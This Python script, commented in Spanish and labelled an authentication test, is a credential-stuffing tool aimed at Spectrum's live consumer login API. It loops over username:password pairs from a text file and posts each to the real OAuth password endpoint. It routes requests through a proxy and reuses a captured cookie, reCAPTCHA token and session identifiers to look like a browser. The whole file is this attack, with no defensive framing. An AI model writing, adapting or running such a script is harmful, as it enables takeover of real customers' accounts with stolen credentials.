import argparse
import os
import requests
import json

# Configura las propiedades de proxy
os.environ['http_proxy'] = 'http://YOUR_PROXY_IP:YOUR_PROXY_PORT'
os.environ['https_proxy'] = 'http://YOUR_PROXY_IP:YOUR_PROXY_PORT'

# Define los argumentos de línea de comandos
parser = argparse.ArgumentParser(description='Prueba de autenticación en Spectrum')
parser.add_argument('--cookie', required=True, help='Cookie para la solicitud')
parser.add_argument('--user-agent', required=True, help='User-Agent para la solicitud')
parser.add_argument('--client-quantum-visit-id', required=True, help='ID de visita cuántica del cliente')
parser.add_argument('--quantum-visit-id', required=True, help='ID de visita cuántica')
parser.add_argument('--recaptcha-token', required=True, help='Token de reCAPTCHA')
parser.add_argument('--portal-transaction-id', required=True, help='ID de transacción del portal')

args = parser.parse_args()

# Abre el archivo de usuarios y contraseñas
with open('usuarios.txt', 'r') as file:
    usuarios = file.readlines()

# Itera sobre las líneas del archivo
for linea in usuarios:
    usuario, contraseña = linea.strip().split(':')

    # Crea el objeto de solicitud
    response = requests.post('https://apis.spectrum.net/auth/oauth/v2/consumer/ca/password/auth',
                             headers={
                                 'Accept': 'application/json, text/plain, */*',
                                 'Accept-Encoding': 'gzip, deflate, br',
                                 'Accept-Language': 'en-US,en;q=0.9',
                                 'Authorization': 'Basic ZmdkZmdkZmc6ZmdmZGdmZGc=',
                                 'Connection': 'keep-alive',
                                 'Content-Length': '588',
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'Cookie': args.cookie,
                                 'Host': 'apis.spectrum.net',
                                 'Origin': 'https://id.spectrum.net',
                                 'Referer': 'https://id.spectrum.net/',
                                 'User-Agent': args.user_agent,
                                 'x-client-id': 'consumer_portal',
                                 'x-client-quantum-visit-id': args.client_quantum_visit_id,
                                 'X-IDM-Client-Origin': 'https://www.spectrum.net',
                                 'X-QuantumVisitId': args.quantum_visit_id,
                                 'x-recaptcha-token': args.recaptcha_token,
                                 'x-client': 'consumer_portal',
                                 'x-portal-transaction-id': args.portal_transaction_id
                             },
                             data={
                                 'client_id': 'consumer_portal',
                                 'response_type': 'code',
                                 'nonce': '360569760390007139204139167779',
                                 'state': 'YOUR_STATE_STRING',
                                 'code_challenge': 'T8JjAatENAAjRcwI6ZiClEYNbDRY4KYtaWaS4Kq982U',
                                 'code_challenge_method': 'S256',
                                 'account_type': 'RESIDENTIAL',
                                 'redirect_uri': 'https://www.spectrum.net/sign-in-redirect',
                                 'tmsid': '28wvtoobwrg1730388544863'
                             },
                             params={
                                 'username': usuario,
                                 'password': contraseña
                             },
                             proxies={
                                 'http': os.getenv('http_proxy'),
                                 'https': os.getenv('https_proxy')
                             })

    # Comprueba el código de respuesta
    if response.status_code == 200:
        # Procesa la respuesta
        print(json.loads(response.text))
    else:
        print(f'Error: {response.status_code}')
        print(response.text)
